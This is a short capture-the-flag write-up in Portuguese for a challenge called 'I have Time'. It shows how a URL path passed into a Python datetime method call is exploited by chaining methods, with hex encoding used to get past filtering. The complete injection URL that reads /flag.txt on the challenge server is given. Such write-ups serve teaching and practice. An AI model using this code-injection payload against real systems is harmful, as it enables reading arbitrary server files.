I have Time
===========

Olhando o site em http://178.63.58.69:8081/ foi notado a seguinte URI '/images/now',
a qual gera uma imagem mostrando o tempo atual. Modificando 'now' para 'today' podemos
perceber que continua exibindo uma data, o que levou a pensar que o 'now' seria o método
chamado do objeto 'datetime' do Python, ficando 'datetime.datetime.%input%()'.

A partir dai a ideia é ler o arquivo /flag.txt, que é mencionado na descrição da task,
através de possivel chamada de método encadeada.

Testando varias coisas foi possível perceber que ao testar:
```
/images/now().strftime("/flag.txt").strip
```

().flag.txt era exibida na imagem, o que exigiu procurar uma outra forma de passar tal
string na url, o que pode ser feito de N formas, passando em hex seria uma delas.

```
$ python -c "print '/flag.txt'.encode('hex')"
2f666c61672e747874
```

Feito isso, basta agora executar um open().read(), mostrando o conteúdo do arquivo na imagem.

```
http://178.63.58.69:8081/images/now().strftime(open('2f666c61672e747874'.decode('hex')).read()).strip
```

PS: Créditos para **danilonc** por identificar o objeto datetime e o uso de strftime para ajudar a exibir informação na imagem.
